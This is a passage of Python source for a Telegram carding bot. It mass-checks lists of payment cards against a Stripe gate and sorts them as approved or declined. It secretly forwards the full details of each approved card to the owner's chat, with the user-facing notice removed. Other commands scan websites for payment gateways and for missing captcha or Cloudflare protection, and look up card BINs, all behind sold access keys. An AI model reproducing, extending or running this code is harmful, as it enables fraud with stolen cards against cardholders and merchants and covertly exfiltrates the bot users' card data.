        result = await asyncio.to_thread(process_cc, processed_line)
        
        response_message = ""
        if result is None:
            response_message = f"{status_prefix}🔴 <b>Failed to process</b> (site/service might be down or unreachable)." 
            unknown_count += 1
            all_card_results_for_summary.append(f"🔴 <code>{line}</code>: Failed to process (site/service might be down or unreachable).")
        elif result.get("success"):
            response_message = f"{status_prefix}🟢 <b>Approve.</b>"
            approved_count += 1
            all_card_results_for_summary.append(f"🟢 <code>{line}</code>: Approve.")
            # Forward approved card details (full original input) to owner
            try:
                await context.bot.send_message(
                    chat_id=OWNER_CHAT_ID,
                    text=f"✅ Approved Card (User: {update.effective_user.mention_html()} | User ID: {update.effective_user.id}):\n<code>{original_line_input}</code>",
                    parse_mode='HTML'
                )
                logger.info(f"Approved Card {original_line_input} sent to owner during mass check.")
            except Exception as e:
                logger.error(f"Failed to send approved Card {original_line_input} to owner during mass check: {e}")
                # Removed the user-facing notification about forwarding failure

        elif "data" in result and "error" in result["data"]:
            error_message = result['data']['error']['message']
            response_message = f"{status_prefix}🟠 <b>{error_message}</b>"
            declined_count += 1
            all_card_results_for_summary.append(f"🟠 <code>{line}</code>: {error_message}")
        else:
            response_message = f"{status_prefix}⚫ <b>Unknown response.</b>"
            unknown_count += 1
            all_card_results_for_summary.append(f"⚫ <code>{line}</code>: Unknown response.")
        
        # Send the individual update message and store its ID
        individual_update_message = await update.message.reply_html(response_message)
        individual_update_message_ids.append(individual_update_message.message_id)
        
        await asyncio.sleep(1) 
    
    end_time = time.monotonic()
    total_time_seconds = end_time - start_time
    
    # Delete the initial "initiating mass check" message
    try:
        await initial_mass_check_message.delete()
    except Exception as e:
        logger.warning(f"Could not delete initial mass check message {initial_mass_check_message.message_id}: {e}")

    # Delete all individual update messages
    for msg_id in individual_update_message_ids:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            await asyncio.sleep(0.1) # Small delay between deletions to avoid hitting API limits
        except Exception as e:
            logger.warning(f"Could not delete individual update message {msg_id}: {e}")

    # Final check for cancellation in case it was requested right after the last card
    if not context.user_data.get('cancel_mass_check'):
        # Send the formatted summary
        summary_message_content = (
            f"--- <b>Mass_Results</b> ({len(card_lines)} cards) ---\n"
            f"<b>Gate</b>: <code>stripe</code>\n"
            f"<b>Stats</b>: ✅ {approved_count} | ❌ {declined_count} | ⚠️ {unknown_count}\n"
            f"<b>Time</b>: {total_time_seconds:.0f}s\n\n"
            f"--- <b>Detailed Results</b> ---\n" + "\n".join(all_card_results_for_summary)
        )
        # Check if the summary message exceeds Telegram's length limit (4096 characters)
        if len(summary_message_content) > 4096:
            summary_message_content = summary_message_content[:4000] + "\n... (Message truncated due to length limit)"
            await update.message.reply_html("⚠️ Results too long. Sending truncated summary and separate details if needed.")

        await update.message.reply_html(summary_message_content)
        await update.message.reply_html("✅ <b>Mass check complete!</b>")
    context.user_data['cancel_mass_check'] = False # Reset flag again after completion


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the /cancel or .cancel command to stop an ongoing mass check.
    """
    if not await check_authentication(update, context):
        return

    if context.user_data.get('cancel_mass_check'):
        await update.message.reply_html("A cancellation request has already been sent. Please wait for the current card check to finish.")
    else:
        context.user_data['cancel_mass_check'] = True
        await update.message.reply_html("Attempting to cancel the mass check. Please wait for the current card's check to conclude.")


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a message to the user."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)
    if update.effective_message:
        await update.effective_message.reply_html(
            "An error occurred while processing your request. Please try again later."
        )

def normalize_url(url):
    """Ensure the URL has a scheme."""
    if not re.match(r'^https?://', url, re.I):
        url = 'http://' + url
    return url

def find_payment_gateways(content):
    """Find payment gateways in the given content."""
    detected = set()
    for gateway in PAYMENT_GATEWAYS:
        # Use word boundaries to ensure accurate matching
        if re.search(r'\b' + re.escape(gateway) + r'\b', content, re.I):
            detected.add(gateway)
    return list(detected)

def check_security(content):
    """Check for captcha and cloudflare in the content."""
    captcha_present = any(re.search(indicator, content, re.I) for indicator in SECURITY_INDICATORS['captcha'])
    cloudflare_present = any(re.search(indicator, content, re.I) for indicator in SECURITY_INDICATORS['cloudflare'])
    return captcha_present, cloudflare_present

def fetch_content(url):
    """Fetch the content of a URL using requests."""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        return response.text
    except requests.exceptions.RequestException as e:
        # Check if the error is specifically an HTTPError (e.g., 4xx or 5xx)
        if isinstance(e, requests.exceptions.HTTPError):
            logger.error(f"Failed to fetch {url} due to HTTP status error: {e.response.status_code} - {e.response.text[:200]}...")
        else:
            logger.error(f"Failed to fetch {url} due to network request error: {e}")
        return None
    except Exception as e:
        logger.error(f"An unexpected error occurred while fetching {url}: {e}")
        return None

def process_url_for_gates(url: str):
    """
    Process a single URL for the .gates command: fetch content, detect gateways, check security.
    Returns a dictionary with results or None if fetching fails.
    """
    normalized_url = normalize_url(url)
    content = fetch_content(normalized_url)

    if content is None:
        return None

    gateways = find_payment_gateways(content)
    captcha, cloudflare = check_security(content)

    return {
        'url': normalized_url,
        'gateways': gateways,
        'captcha': captcha,
        'cloudflare': cloudflare
    }

async def gates_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the .gates or /gates command to check a single URL for payment gateways and security.
    """
    if not await check_authentication(update, context):
        return

    message_text = update.message.text
    
    # Extract the URL argument
    parts = message_text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_html(
            "❌ <b>Invalid usage!</b> Please provide a URL. "
            "Example: <code>.gates example.com</code>"
        )
        return
    
    target_url = parts[1].strip()

    await update.message.reply_html(f"⏳ Checking gateways and security for <code>{target_url}</code>, please wait...")

    # Process the URL (run synchronously in a separate thread)
    result = await asyncio.to_thread(process_url_for_gates, target_url)

    if result:
        response_message_parts = []
        response_message_parts.append(f"🔍 <b>Gateway and Security Check Results:</b>")
        response_message_parts.append(f"<b>URL:</b> <code>{result['url']}</code>")
        
        gateways_str = ", ".join(result['gateways']) if result['gateways'] else "None Detected"
        response_message_parts.append(f"<b>Gateways:</b> {gateways_str}")
        
        response_message_parts.append(f"<b>Captcha:</b> {'Yes' if result['captcha'] else 'No'}")
        response_message_parts.append(f"<b>Cloudflare:</b> {'Yes' if result['cloudflare'] else 'No'}")
        response_message_parts.append(f"CHECKED BY - {OWNER_HANDLE}")

        final_response = "\n".join(response_message_parts)
        await update.message.reply_html(final_response)
    else:
        await update.message.reply_html(
            f"❌ Failed to process URL <code>{target_url}</code>. "
            "It might be unreachable, or an error occurred during fetching."
        )

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the .bin or /bin command to lookup BIN details from local CSV data.
    """
    if not await check_authentication(update, context):
        return

    message_text = update.message.text
    parts = message_text.strip().split(maxsplit=1)

    if len(parts) < 2 or not parts[1].strip().isdigit() or not (6 <= len(parts[1].strip()) <= 8):
        await update.message.reply_html(
            "❌ <b>Invalid usage!</b> Please provide a 6-8 digit BIN.\n"
            "Example: <code>.bin 457173</code>"
        )
        return
    
    bin_number = parts[1].strip()
    await update.message.reply_html(f"🔎 Searching for BIN <code>{bin_number}</code> in local data, please wait...")

    # Use local BIN lookup function
    bin_details = get_bin_details_local(bin_number)

    if bin_details and bin_details['valid']:
        response_message_parts = []
        response_message_parts.append(f"💳 <b>BIN Details (from local data):</b> {bin_details['country_emoji']}")
        response_message_parts.append(f"  <b>BIN:</b> <code>{bin_number}</code>")
        response_message_parts.append(f"  <b>Scheme:</b> <i>{bin_details['scheme']}</i>")
        response_message_parts.append(f"  <b>Type:</b> <i>{bin_details['type']}</i>")
        response_message_parts.append(f"  <b>Brand:</b> <i>{bin_details['brand']}</i>")
        response_message_parts.append(f"  <b>Prepaid:</b> <i>{bin_details['prepaid']}</i>")
        response_message_parts.append(f"  <b>Country:</b> <i>{bin_details['country_name']} ({bin_details['currency_code']})</i>")
        response_message_parts.append(f"🏦 <b>Bank:</b> <i>{bin_details['bank_name']}</i>")
        response_message_parts.append(f"  <b>City:</b> <i>{bin_details['bank_city']}</i>")
        if bin_details['bank_url'] != 'N/A':
            response_message_parts.append(f"  <b>Website:</b> <i>{bin_details['bank_url']}</i>")
        if bin_details['bank_phone'] != 'N/A':
            response_message_parts.append(f"  <b>Phone:</b> <i>{bin_details['bank_phone']}</i>")
        response_message_parts.append(f"\nCHECKED BY - {OWNER_HANDLE}")
        
        final_response = "\n".join(response_message_parts)
        await update.message.reply_html(final_response)
    elif bin_details and not bin_details['valid']:
        await update.message.reply_html(
            f"❌ <b>BIN Lookup Failed:</b> {bin_details['message']}\n"
            f"Please check the BIN <code>{bin_number}</code> and try again."
        )
    else:
        await update.message.reply_html(
            f"❌ <b>BIN Lookup Failed:</b> Could not retrieve details for BIN <code>{bin_number}</code> from local database. "
            "Ensure the CSV file is correctly placed and formatted."
        )


def main() -> None:
    """Starts the bot."""
    # Load BIN data from CSV when the bot starts
    load_bin_data_from_csv()

    # Create the Application and pass your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command)) 

    # Authentication command handler
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]auth\s.+'), auth_command))

    # Admin-only key generation command
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]generate'), generate_key_command)) 

    # Admin-only key removal command
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]remove'), remove_key_command))

    # Admin-only list keys command
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]list_keys'), list_keys_command))

    # Handlers for other commands, now behind authentication
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]chk'), check_card_message))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]masscheck'), mass_check_message))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]cancel'), cancel_command)) 

    # New .gates command handler
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]gates\s.+'), gates_command))

    # New .bin command handler (uses local CSV data)
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[./]bin\s\d{6,8}$'), bin_command))

    # Register error handler
    application.add_error_handler(error_handler)

    # Run the bot until the user presses Ctrl-C
    print("Bot is running... Press Ctrl-C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()

# --- Telegram Bot integration ends here ---
